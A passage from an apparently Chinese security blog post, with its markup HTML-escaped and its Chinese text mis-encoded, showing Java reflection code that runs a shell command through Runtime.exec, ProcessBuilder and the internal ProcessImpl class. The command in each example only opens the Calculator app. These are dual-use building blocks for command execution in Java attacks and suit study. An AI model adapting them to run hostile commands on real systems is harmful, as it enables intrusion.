        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;runtime&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;ProcessBuilder&quot;&gt;&lt;a href=&quot;#ProcessBuilder&quot; class=&quot;headerlink&quot; title=&quot;ProcessBuilder&quot;&gt;&lt;/a&gt;ProcessBuilder&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨&lt;code&gt;constructor&lt;/code&gt;åˆå§‹åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œæ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œæ‰€ä»¥éœ€è¦&lt;code&gt;new Object[]&lt;/code&gt;å¼ºåˆ¶è½¬æ¢: &lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessBuilder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt; constructor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getConstructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;//å½“ä½¿ç”¨Listç±»å‹çš„æ„é€ å‚æ•°&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;//newInstanceæ¥æ”¶çš„æ˜¯ä¸€ä¸ªObjectæ•°ç»„ï¼Œéœ€è¦è½¬åŒ–ä¸€ä¸‹&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt; pb &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; constructor&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;asList&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cmd&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        method1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pb&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt; reflectProcessBuilder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessBuilder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//        reflectProcessBuilder.ReflectPB0();&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;reflectProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;ReflectPB1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ProcessImpl&quot;&gt;&lt;a href=&quot;#ProcessImpl&quot; class=&quot;headerlink&quot; title=&quot;ProcessImpl&quot;&gt;&lt;/a&gt;ProcessImpl&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;relfectDemo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HashMap&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;util&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectProcessImpl&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; cmd &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;open /System/Applications/Calculator.app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReflectPI0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; clazz &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.lang.ProcessImpl&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt; method &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; clazz&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ProcessBuilder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Redirect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;boolean&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
